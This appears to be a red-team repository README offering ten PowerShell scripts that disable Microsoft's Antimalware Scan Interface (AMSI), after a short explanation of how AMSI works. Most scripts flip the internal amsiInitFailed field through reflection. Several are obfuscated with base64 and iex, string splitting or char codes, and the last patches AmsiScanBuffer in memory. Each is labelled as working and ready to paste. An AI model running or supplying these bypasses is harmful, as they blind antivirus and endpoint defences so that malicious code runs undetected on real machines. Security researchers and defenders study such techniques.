# RedTeam-PowerShell-AMSI-Bypass
PowerShell AMSI Bypass Scripts
# **What is AMSI**

Microsoft Antimalware Scan Interface (AMSI) is a Windows security interface introduced by Microsoft to allow applications and scripting engines to submit content to antivirus and endpoint security products for inspection before execution.

PowerShell integrates with AMSI so that:
- Scripts
- Command strings
- Dynamically generated code
- Deobfuscated content
can be scanned by the installed security provider before execution continues.

When PowerShell runs suspicious content, it typically:

- **Sends the content buffer to AMSI**
- **AMSI forwards it to Microsoft Defender or another AV/EDR**
- **The provider analyzes the content**
- **A detection verdict is returned**
- **PowerShell either allows or blocks execution**
The AMSI integration inside PowerShell is implemented through internal .NET classes within the System.Management.Automation assembly.
---



## **How Bypass Works**

1. **Reflection is a .NET feature that allows code to**:
   - inspect assemblies.
   - enumerate types.
   - access methods and fields.
   - interact with internal members at runtime.

2. **The scripts access an internal PowerShell class**:
   - System.Management.Automation.AmsiUtils.

3. **Inside this class there is an internal static field commonly referenced as**:
   - amsiInitFailed.
This field represents whether AMSI initialization failed inside the current PowerShell process.

4. **and set it to**:
   - $true.
This makes the current PowerShell process behave as if AMSI initialization failed, which changes how AMSI scanning operates for that session.
---

## **How To Use**

### **1. AMSI Bypass Script [Past both line Seprate / one by one] (Working)**
```bash
$v1=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); if($v1){$v2=$v1.GetField('amsiInitFailed','NonPublic,Static'); if($v2){"AMSI Bypass Patch Applied Successfully!"}else{"Field not found"}}else{"Type not resolved"}; 

$v2.SetValue($null,$true)
```

### **2. AMSI Bypass Script [Past Each Line on New Line] (Working)**
```bash
$amsi=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); if(-not $amsi){Write-Error "Type not resolved"; return}; 

$field=$amsi.GetField('amsiInitFailed','NonPublic,Static'); if(-not $field){Write-Error "Field not found"; return}; 

$field.SetValue($null,$true);Write-Output "AMSI Bypass Patch Applied Successfully!"
```

### **3. AMSI Bypass Script [Past Each Line on New Line] (Working)**
```bash
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');

if (-not $amsi) { Write-Error "Type not resolved"; return };

$field = $amsi.GetField('amsiInitFailed','NonPublic,Static');

if (-not $field) { Write-Error "Field not found"; return };

$field.SetValue($null, $true);Write-Output "AMSI Bypass Patch Applied Successfully!"
```

### **4. AMSI Bypass Script [Past Each Line on New Line] (Working)**
```bash
$A1=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); if(-not $A1){Write-Error "Type not resolved"; return}; $A2=

$A1.GetField('amsiInitFailed','NonPublic,Static'); if(-not $A2){Write-Error "Field not found"; return}; 

$A2.SetValue($null,$true);Write-Output "AMSI Bypass Patch Applied Successfully!"
```


### **5. AMSI Bypass Script [Past Each Line on New Line] (Working)**
```bash
$c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGEgPSBbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtc2lVdGlscycpOyAkYiA9ICRhLkdldEZpZWxkKCdhbXNpSW5pdEZhaWxlZCcsJ05vblB1YmxpYyxTdGF0aWMnKTs=')); iex $c

$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGIuU2V0VmFsdWUoJG51bGwsJHRydWUpOw==')); iex $d; Write-Output "AMSI Bypass Patch Applied Successfully!"
```

### **6. AMSI Bypass Script [One Liner] (Working)**
```bash
$c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGEgPSBbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtc2lVdGlscycpOyAkYiA9ICRhLkdldEZpZWxkKCdhbXNpSW5pdEZhaWxlZCcsJ05vblB1YmxpYyxTdGF0aWMnKTs=')); iex $c; $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGIuU2V0VmFsdWUoJG51bGwsJHRydWUpOw==')); iex $d; Write-Output "AMSI Bypass Patch Applied Successfully!"
```

### **7. AMSI Bypass Script [One Liner] (Working)**
```bash
[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### **8. AMSI Bypass Script [One Liner] (Working)**
```bash
$t=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); if($t){$f=$t.GetField('amsiInitFailed','NonPublic,Static'); $target=$null; $value=$true; if($f){"AMSI Bypass Patch Applied Successfully!"; $f.SetValue($target,$value)} else {"Field missing"}} else {"Type missing"}
```

### **9. AMSI Bypass Script  [One Liner] (Work On Old/Unpatch Versions)**
```bash
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} ); Write-Output "AMSI Bypass Patch Applied Successfully!"
```

### **10. AMSI Bypass Script  [copy this script  ans save i=it as .ps1 file and run in powershell] (Work On Old/Unpatch Versions)**
```bash
$A=[Ref].Assembly.GetType((([char]65)+([char]109)+([char]115)+([char]105)+([char]85)+([char]116)+([char]105)+([char]108)+([char]115))
)
$F=$A.GetField((([char]65)+([char]109)+([char]115)+([char]105)+([char]73)+([char]110)+([char]105)+([char]116)+([char]70)+([char]97)+([char]105)+([char]108)+([char]101)+([char]100)),'NonPublic,Static')
$F.SetValue($null,$true)
$Win=[Ref].Assembly.GetType('System.Management.Automation.Utils')
$PtrType = [System.IntPtr]
$Win=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$AmsiDLL = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE($Win.Module)
$GetProcAddress = (Add-Type -MemberDefinition '
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);' -Name "Win32" -Namespace Win32Functions -PassThru)
$AmsiScanBufferPtr = $GetProcAddress::GetProcAddress($AmsiDLL,"AmsiScanBuffer")
$Patch = [byte[]]@(0xB8,0x57,0x00,0x07,0x80,0xC3) # Mov eax,0x80070057; ret
$UnsafeNativeMethods = @"
using System;
using System.Runtime.InteropServices;
public class UnsafeNativeMethods {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $UnsafeNativeMethods
$oldProtect = 0
[UnsafeNativeMethods]::VirtualProtect($AmsiScanBufferPtr, [uint32]6, 0x40, [ref]$oldProtect) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $AmsiScanBufferPtr, $Patch.Length)
[UnsafeNativeMethods]::VirtualProtect($AmsiScanBufferPtr, [uint32]6, $oldProtect, [ref]$oldProtect) | Out-Null
Write-Output "AMSI Bypass Patch Applied Successfully!"
```

